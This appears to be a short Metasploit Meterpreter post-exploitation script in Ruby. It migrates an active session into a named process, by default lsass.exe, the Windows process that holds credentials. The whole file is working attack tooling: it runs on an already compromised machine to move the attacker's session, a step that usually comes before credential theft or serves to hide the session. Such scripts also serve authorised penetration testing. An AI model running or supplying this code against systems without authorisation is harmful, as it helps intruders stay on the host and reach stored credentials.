#
# Simple example script that migrates to a specific process by name. 
# This is meant as an illustration.
#

# Get the target process name
target = args[0] || "lsass.exe"

print_status("Migrating to #{target}...")

server = client.sys.process.open

print_status("Current server process: #{server.name} (#{server.pid})")

# Get the target process pid
target_pid = client.sys.process[target]

if target_pid.nil?
	raise ArgumentError, "Could not find target process: #{target}"
end

# Do the migration
client.core.migrate(target_pid)

server = client.sys.process.open

print_status("New server process: #{server.name} (#{server.pid})")
